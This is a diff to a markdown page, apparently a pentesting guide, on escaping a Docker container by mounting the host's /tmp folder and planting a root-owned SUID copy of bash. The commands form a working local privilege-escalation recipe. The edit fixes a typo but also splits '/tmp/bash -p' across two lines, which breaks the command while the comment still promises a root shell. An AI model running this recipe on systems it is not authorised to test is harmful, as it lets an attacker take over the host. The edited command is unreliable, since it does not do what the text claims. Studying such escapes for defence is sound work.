@@ -395,11 +395,12 @@ Now, the user can escape from the container using any of the previously discusse
 In this case the sysadmin **disallowed users to run containers with the `--privileged` flag** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
 
 ```bash
-host> cp /bin/bash /tmp #Cerate a copy of bash
+host> cp /bin/bash /tmp #Create a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
 docker container> chown root:root /host/bash
 docker container> chmod u+s /host/bash
-host> /tmp/bash -p #This will give you a shell as root
+host> /tmp/bash
+ -p #This will give you a shell as root
 ```
 
 {% hint style="info" %}
